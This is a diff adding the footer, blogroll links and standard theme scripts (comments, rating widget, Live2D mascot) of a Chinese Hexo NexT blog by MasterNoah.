+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      友链
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://masternoah.lofter.com/" title="https:&#x2F;&#x2F;masternoah.lofter.com&#x2F;" rel="noopener" target="_blank">Noah的Lofter主页</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.dicecho.com/account/6048c166aed4d4001dfe89e6" title="https:&#x2F;&#x2F;www.dicecho.com&#x2F;account&#x2F;6048c166aed4d4001dfe89e6" rel="noopener" target="_blank">Noah的Dicecho主页</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.noahtie.site/" title="https:&#x2F;&#x2F;blog.noahtie.site&#x2F;" rel="noopener" target="_blank">Noah的博客站点</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">MasterNoah</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+  <script>
+  if (CONFIG.page.isPost) {
+    wpac_init = window.wpac_init || [];
+    wpac_init.push({
+      widget: 'Rating',
+      id    : 31094,
+      el    : 'wpac-rating',
+      color : 'fc6423'
+    });
+    (function() {
+      if ('WIDGETPACK_LOADED' in window) return;
+      WIDGETPACK_LOADED = true;
+      var mc = document.createElement('script');
+      mc.type = 'text/javascript';
+      mc.async = true;
+      mc.src = '//embed.widgetpack.com/widget.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(mc, s.nextSibling);
+    })();
+  }
+  </script>
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : true,
+      appId      : 'mqyLbi5yBBtoXYLz5apgRROM-gzGzoHsz',
+      appKey     : 'YXWSW4teiVpIqLFpCSfAYXsI',
+      placeholder: "来说点什么嘛？",
+      avatar     : 'monsterid',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : true,
+      serverURLs : 'https://mqylbi5y.lc-cn-n1-shared.com'
+    });
+  }, window.Valine);
+});
+</script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
